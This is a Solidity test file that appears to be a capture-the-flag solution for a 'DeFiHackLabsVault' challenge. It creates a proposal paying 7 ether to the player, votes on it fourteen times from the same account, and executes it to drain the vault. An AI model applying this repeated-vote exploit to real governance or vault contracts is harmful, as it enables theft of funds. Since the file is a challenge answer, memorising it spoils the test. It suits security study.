// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {DeFiHackLabsVaultBaseTest} from "test/DeFiHackLabsVault/DeFiHackLabsVaultBase.t.sol";
import {DeFiHackLabsVault} from "src/DeFiHackLabsVault/DeFiHackLabsVault.sol";

contract DeFiHackLabsVaultTest is DeFiHackLabsVaultBaseTest {
    function testDeFiHackLabsVaultExploit() public checkSolved {
        DeFiHackLabsVault.Proposal memory proposal;
        proposal.receiver = player;
        proposal.amount = 7 ether;

        uint256 id = deFiHackLabsVault.createProposal{value: 1 ether}(proposal);

        for (uint256 i; i < 14; ++i) {
            deFiHackLabsVault.vote(id);
        }

        deFiHackLabsVault.execute(id);
    }
}
